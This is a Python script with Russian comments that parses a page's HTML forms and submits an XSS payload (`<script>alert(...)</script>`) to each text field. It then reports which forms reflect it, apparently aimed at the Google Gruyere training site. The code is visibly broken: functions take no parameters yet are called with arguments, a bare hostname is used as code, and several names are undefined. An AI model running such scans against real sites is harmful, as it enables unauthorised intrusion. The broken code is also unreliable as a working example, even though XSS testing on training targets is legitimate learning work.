```python
from scapy.all import *
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import requests


def get_all_forms():
    """
    функция парсинга для HTML
    """
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details():
    """
    вводные данные
    """
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    # представление в виде словаря
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form():
    """
    отправка формы
    """
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    print(f"[+] Отправление вредоносной полезной нагрузки на сайт {google-gruyere.appspot.com}")
    print(f"[+] Данные: {data}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # вывод GET-запроса
        return requests.get(target_url, params=data)


def scan_xss():
    """ 
    вывод всех уязвимые формы XSS и возврат True, если какая-либо из них уязвима, False в ином случае
    """
    # получение всех форм по URL-адресу
    forms = get_all_forms(google-gruyere.appspot.com)
    print(f"[+] Обнаружена {len(forms)} форма на сайте {google-gruyere.appspot.com}.")
    xss_vulnerability = "<script>alert('XSS уязвимость')</script>"
    # возвращаемое значение
    is_vulnerable = False
    # итерация для всех форм
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, google-gruyere.appspot.com, js_script).content.decode()
        if xss_vulnerability in content:
            print(f"[+] XSS уязвимость обнаружена на сайте : {google-gruyere.appspot.com}")
            print(f"[*] Сведения о форме:")
            pprint(form_details)
            is_vulnerable = True
            # цикл не прерывается, т.к. вывод других доступных уязвимых форм XSS
    return is_vulnerable


if __name__ == "__main__":
    import sys
    url = sys.argv[1]
    print(scan_xss(url))
```
